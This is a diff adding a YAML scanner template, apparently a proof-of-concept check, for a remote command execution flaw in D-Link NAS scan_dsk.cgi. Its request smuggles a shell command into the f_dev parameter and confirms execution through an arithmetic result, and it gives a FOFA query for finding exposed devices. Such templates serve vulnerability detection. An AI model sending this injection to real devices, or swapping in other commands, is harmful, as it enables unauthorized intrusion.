@@ -1,0 +1,18 @@
+id: poc-yaml-d-link-nas-scandsk-cgi-rce
+info:
+  name: D-Link NAS scan_dsk.cgi存在远程命令执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: d-link
+  fofa: app="D_Link-DNS-ShareCenter"
+variables:
+  t1: random_int(111000,999000)
+  t2: random_int(10,100)
+  t3: t1 - t2
+requests:
+- method: GET
+  path: /cgi-bin/scan_dsk.cgi?cmd=ScanDisk_run_e2fsck&f_dev=x;expr%20{{.t1}}%20-%20{{.t2}};
+  expression: "status_code == 200 && \ncontains(body,\"location.href\") &&\ncontains(body,t3)\
+    \ &&\ncontains(headers,\"lighttpd\")\n"
+transport: http
